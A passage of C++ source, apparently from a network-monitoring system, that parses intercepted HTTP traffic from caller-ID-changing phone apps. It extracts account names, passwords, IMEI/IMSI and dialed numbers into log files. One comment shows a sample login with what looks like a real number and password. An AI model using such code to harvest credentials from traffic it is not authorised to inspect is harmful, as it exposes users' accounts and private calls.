
#include "StdAfx.h"
#include "http.h"
#include "HttpSession.h"
#include "PhoneNumCheat.h"

#define PNC_LOGIN		1
#define PNC_DIAL		2
#define PNC_QUIT		4
#define PNC_REPORT		8
#define PNC_REG			16
#define PNC_CHANGENUM	32

#define PNC_PHONE_NO_LEN 32
#define PNC_PASSWORD_LEN 32
#define PNC_EMAIL_LEN	 32

BOOL DealPhoneNumCheat(HttpSession * pHttpSession,const char *pPacket)
{
	int Action = 0;

	if (Action= IsPNCSecondNumPacket(pHttpSession))
	{
		ProcessPNCSecondNumPacket(pHttpSession,pPacket,Action);
	}

	if (Action= IsPNCBHSQpacket(pHttpSession))
	{
		ProcessPNCBHSQpacket(pHttpSession,pPacket,Action);
	}

	if (Action= IsPNCBHWpacket(pHttpSession))
	{
		ProcessPNCBHWpacket(pHttpSession,pPacket,Action);
	}

	if (Action= IsPNCBYBHpacket(pHttpSession))
	{
		ProcessPNCBYBHpacket(pHttpSession,pPacket,Action);
	}

	if (Action= IsPNCBSBHpacket(pHttpSession))
	{
		ProcessPNCBSBHpacket(pHttpSession,pPacket,Action);	
	}

	if (Action= IsPNCX8packet(pHttpSession))
	{
		ProcessPNCX8packet(pHttpSession,pPacket,Action);	
	}
			
	return FALSE;
}

CString PNCGetItemValue(const CString &str,char sep)
{
	if(str.Find(sep) != -1)
	{
		return str.Mid(str.Find(sep) + 1);
	}
	else
	{
		return "";
	}
}

void PNCSplitString(CString strSrc ,CStringArray &arrayDest,char sep)
{
	CString tmpstr;
	int pos = strSrc.Find(sep);
	while (pos >= 0)
	{
		tmpstr=strSrc.Left(pos);
		tmpstr.TrimRight();
		tmpstr.TrimLeft();
		arrayDest.Add(tmpstr);
		strSrc = strSrc.Mid(pos+1);
		pos = strSrc.Find(sep);
	}
	if((pos == -1) && (!strSrc.IsEmpty()))
	{
		arrayDest.Add(strSrc);	
	}
}


//第二号码
int IsPNCSecondNumPacket(HttpSession *pHttpSession)
{
	if(pHttpSession->m_Requestline.m_URL.Find("/MCSSECNUM/userctrl") != -1) 
	{
		return PNC_LOGIN ;
	}
// 	else if(pHttpSession->m_Requestline.m_URL.Find("/MCSSECNUM/callinctrl") != -1)	//太多的包不需要
// 	{
// 		return REPORT;
// 	}
	else if(pHttpSession->m_Requestline.m_URL.Find("/MCSSECNUM/conferencectrl") != -1) 
	{
		return PNC_DIAL;
	}
	return FALSE;
}

BOOL ProcessPNCSecondNumPacket(HttpSession *pHttpSession,const char * pPacket, int Action)
{
	char *pHead = NULL;
	int arrsize = 0;
	CString strUser,strPass,strIMEI,strIMSI,strModel,strBindPhone,strFrom,strTo;
	
	if( Action == PNC_LOGIN )
	{
		pHead = strstr(pPacket,"action=userLogin");
		if (pHead)
		{	
			CString strTempData(pHead);
			CStringArray arrTemp;
			PNCSplitString(strTempData,arrTemp,'&');
			
			arrsize = arrTemp.GetSize();
			for (int i = 0; i < arrsize; i++)
			{
				if ( arrTemp[i].Find("hostNumber=") != -1 )
				{
					strUser = PNCGetItemValue(arrTemp[i],'=');
				}
				if ( arrTemp[i].Find("password=") != -1)
				{
					strPass = PNCGetItemValue(arrTemp[i],'=');
				}
				if ( arrTemp[i].Find("imei=") != -1 )
				{
					strIMEI = PNCGetItemValue(arrTemp[i],'=');
				}
				if ( arrTemp[i].Find("imsi=") != -1)
				{
					strIMSI = PNCGetItemValue(arrTemp[i],'=');
				}
			}
			
			if (strUser.IsEmpty() || strPass.IsEmpty())
			{
				return FALSE;
			}
			CString FileContent;
			FileContent.Format("user=%s\r\npass=%s\r\nimei=%s\r\nnick=%s\r\nstate=登陆\r\n",strUser,strPass,strIMEI,strIMSI);
			
			SYSTEMTIME CurrentTime;
			GetLocalTime(&CurrentTime);
			CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
			ASSERT(!tmppath.IsEmpty());
			pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_dehm.indexfile.txt",
				tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
				CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
			pHttpSession->WriteIndexFile("pnc_dehm","pnc_dehm",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
			return TRUE;				
		}
	}
	if (Action == PNC_DIAL)
	{
		pHead = strstr(pPacket,"action=confStart");
		if (pHead)
		{
			CString strTempData(pHead);
			CStringArray arrTemp;
			PNCSplitString(strTempData,arrTemp,'&');
			
			arrsize = arrTemp.GetSize();
			for (int i = 0; i < arrsize; i++)
			{
				if ( arrTemp[i].Find("hostNumber=") != -1 )
				{
					strUser = PNCGetItemValue(arrTemp[i],'=');
				}
				if ( arrTemp[i].Find("password=") != -1)
				{
					strPass = PNCGetItemValue(arrTemp[i],'=');
				}
				if ( arrTemp[i].Find("partyNumber=") != -1)
				{
					strTo = PNCGetItemValue(arrTemp[i],'=');
				}
			}
			
			if (strUser.IsEmpty() || strPass.IsEmpty() || strTo.IsEmpty())
			{
				return FALSE;
			}
			
			CString FileContent;
			FileContent.Format("user=%s\r\npass=%s\r\nfrom=%s\r\nto=%s\r\nstate=拨号\r\n",
				strUser,strPass,strUser,strTo);
			
			SYSTEMTIME CurrentTime;
			GetLocalTime(&CurrentTime);
			CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
			ASSERT(!tmppath.IsEmpty());
			pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_dehm.indexfile.txt",
				tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
				CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
			pHttpSession->WriteIndexFile("pnc_dehm","pnc_dehm",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
			return TRUE;				
		}
	}
	return FALSE;
}

//变号神器
//变号神器与变号王很相似
int IsPNCBHSQpacket(HttpSession *pHttpSession)
{
	if( (pHttpSession->m_Requestline.m_URL.Find("/android_interface.php") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("android.bianhaoshenqi.com")) != -1 )
	{
		return TRUE;
	}
	return FALSE;
}

BOOL ProcessPNCBHSQpacket(HttpSession *pHttpSession,const char * pPacket, int Action)
{
	char *pHead = NULL;
	int arrsize = 0;
	CString strUser,strPass,strIMEI,strIMSI,strModel,strBindPhone,strFrom,strTo;

	pHead = strstr(pPacket,"action=login");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
	
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("username=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("userpass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
		}

		if (strUser.IsEmpty() || strPass.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nstate=登陆\r\n",strUser,strPass);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bhsq.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bhsq","pnc_bhsq",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;				
	}

	pHead = strstr(pPacket,"action=setbindphone");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("username=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("userpass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("bindphone=") != -1)
			{
				strBindPhone = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strBindPhone.IsEmpty())
		{
			return FALSE;
		}

		CString FileContent;	
		FileContent.Format("user=%s\r\npass=%s\r\ncontact=%s\r\nstate=绑定\r\n",strUser,strPass,strBindPhone);

		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bhsq.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bhsq","pnc_bhsq",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
						
	}

	pHead = strstr(pPacket,"action=call");
	if (pHead)
	{
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("username=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("userpass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("phone=") != -1)
			{
				strTo = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strTo.IsEmpty())
		{
			return FALSE;
		}

		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nfrom=%s\r\nto=%s\r\nstate=拨号\r\n",
			strUser,strPass,strUser,strTo);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bhsq.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bhsq","pnc_bhsq",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;				
	}
	return FALSE;
}

//变号王
int IsPNCBHWpacket(HttpSession *pHttpSession)
{
	if( (pHttpSession->m_Requestline.m_URL.Find("/bhw_interface/andorid_interface.php") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("www.wntel.com")) != -1 )
	{
		return TRUE;// ver : 5.02
	}
	if( (pHttpSession->m_Requestline.m_URL.Find("/auth_new_andorid_interface.php") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("android.13777888999.com:9090")) != -1 )
	{
		return TRUE;//ver : 6.10
	}
	return FALSE;
}


BOOL ProcessPNCBHWpacket(HttpSession *pHttpSession,const char * pPacket, int Action)
{
	char *pHead = NULL;
	int arrsize = 0;
	CString strUser,strPass,strIMEI,strIMSI,strModel,strBindPhone,strFrom,strTo;

	pHead = strstr(pPacket,"action=login");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("username=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("userpass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nstate=登陆\r\n",strUser,strPass);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bhw.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bhw","pnc_bhw",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}
	
	return FALSE;
}

//变声变号,变号助手等
int IsPNCBSBHpacket(HttpSession *pHttpSession)
{
	if(pHttpSession->m_Requestline.m_URL.Find("/manual/lee.php?") != -1) 
	{
		return TRUE;
	}
	return FALSE;
}

BOOL ProcessPNCBSBHpacket(HttpSession *pHttpSession,const char * pPacket, int Action)
{
	char *pHead = NULL;
	int arrsize = 0;
	CString strUser,strPass,strIMEI,strIMSI,strChanged,strBindPhone,strFrom,strTo;
	
	pHead = strstr(pPacket,"ac=in");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("a=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("p=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nstate=登陆\r\n",strUser,strPass);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bsbh.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bsbh","pnc_bsbh",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}

	pHead = strstr(pPacket,"ac=ckb");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("a=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("f=") != -1)
			{
				strChanged = PNCGetItemValue(arrTemp[i],'=');
			}
			
		}
		
		if (strUser.IsEmpty() || strChanged.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\nwebname=%s\r\nstate=改号\r\n",strUser,strChanged);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bsbh.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bsbh","pnc_bsbh",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}

	pHead = strstr(pPacket,"a=");
	char *pTemp = strstr(pPacket,"b=");
	if (pHead && pTemp)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("a=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
// 			if ( arrTemp[i].Find("password=") != -1 )
// 			{
// 				strPass = PNCGetItemValue(arrTemp[i],'=');
// 			}
			if ( arrTemp[i].Find("b=") != -1)
			{
				strTo = PNCGetItemValue(arrTemp[i],'=');
			}

			
			
		}
		
		if (strUser.IsEmpty() || strTo.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\nfrom=%s\r\nto=%s\r\nstate=拨号\r\n",strUser,strUser,strTo);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bsbh.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bsbh","pnc_bsbh",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}

	return FALSE;
}

//变音变号
int IsPNCBYBHpacket(HttpSession *pHttpSession)
{
	if( (pHttpSession->m_Requestline.m_URL.Find("/interface_android.php") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("interface.momocall.com") != -1) )
	{
		return TRUE;
	}	
	return FALSE;
}
//POST /interface_android.php HTTP/1.1
//Host: interface.momocall.com:8060
//action=login&acct=15275159913&pass=198252&version=2.0
BOOL ProcessPNCBYBHpacket(HttpSession *pHttpSession,const char * pPacket, int Action)
{
	char *pHead = NULL;
	int arrsize = 0;
	CString strUser,strPass,strIMEI,strIMSI,strChanged,strBindPhone,strFrom,strTo;
	
	pHead = strstr(pPacket,"action=login");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("acct=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("pass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nstate=登陆\r\n",strUser,strPass);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bybh.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bybh","pnc_bybh",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}

	pHead = strstr(pPacket,"action=setbind");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("acct=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("pass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("bindphone=") != -1)
			{
				strBindPhone = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strBindPhone.IsEmpty())
		{
			return FALSE;
		}
		
		CString FileContent;	
		FileContent.Format("user=%s\r\npass=%s\r\ncontact=%s\r\nstate=绑定\r\n",strUser,strPass,strBindPhone);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bhsq.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bhsq","pnc_bhsq",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
		
	}

	pHead = strstr(pPacket,"action=call");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("acct=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("pass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("phone=") != -1)
			{
				strTo = PNCGetItemValue(arrTemp[i],'=');
			}
			
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strTo.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nfrom=%s\r\nto=%s\r\nstate=拨号\r\n",
			strUser,strPass,strUser,strTo);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bybh.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bybh","pnc_bybh",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}


	pHead = strstr(pPacket,"action=setcaller");
	if (pHead)
	{	
		CString strTempData(pHead);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("acct=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("pass=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("phone=") != -1)
			{
				strChanged = PNCGetItemValue(arrTemp[i],'=');
			}
			
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strTo.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nwebname=%s\r\nstate=改号\r\n",
			strUser,strPass,strChanged);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_bybh.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_bybh","pnc_bybh",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
	}
	return FALSE;
}

int IsPNCX8packet(HttpSession *pHttpSession)
{
	if( (pHttpSession->m_Requestline.m_URL.Find("/Api/reg?") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("adminx8.cc") != -1) )
	{
		return PNC_REG;
	}	
	else if( (pHttpSession->m_Requestline.m_URL.Find("/Api/query?") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("adminx8.cc") != -1) )
	{
		return PNC_LOGIN;
	}
	else if( (pHttpSession->m_Requestline.m_URL.Find("/Api/call?") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("adminx8.cc") != -1) )
	{
		return PNC_DIAL;
	}
	else if( (pHttpSession->m_Requestline.m_URL.Find("/Api/intelnum?") != -1) &&
		(pHttpSession->m_Requestline.m_Host.Find("adminx8.cc") != -1) )
	{
		return PNC_CHANGENUM;
	}
	return FALSE;
}

BOOL ProcessPNCX8packet(HttpSession *pHttpSession,const char * pPacket, int Action)
{
	
	char *pHead = NULL;
	int arrsize = 0;
	CString strUser,strPass,strIMEI,strIMSI,strChanged,strBindPhone,strFrom,strTo;
	if (Action == PNC_REG)
	{
		CString strTempData(pPacket);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("BindCalled=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("AcctPwd=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nstate=注册\r\n",strUser,strPass);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_x8.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_x8","pnc_x8",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;
				
	}
	if (Action == PNC_DIAL)
	{
	
		CString strTempData(pPacket);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("name=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("AcctPwd=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("CalledA=") != -1)
			{
				strTo = PNCGetItemValue(arrTemp[i],'=');
			}
			
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strTo.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nfrom=%s\r\nto=%s\r\nstate=拨号\r\n",
			strUser,strPass,strUser,strTo);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_x8.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_x8","pnc_x8",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
	
		return TRUE;				
	}
	if (Action == PNC_LOGIN)
	{
		CString strTempData(pPacket);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("name=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("AcctPwd=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nstate=登陆\r\n",strUser,strPass);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_x8.indexfile.txt",
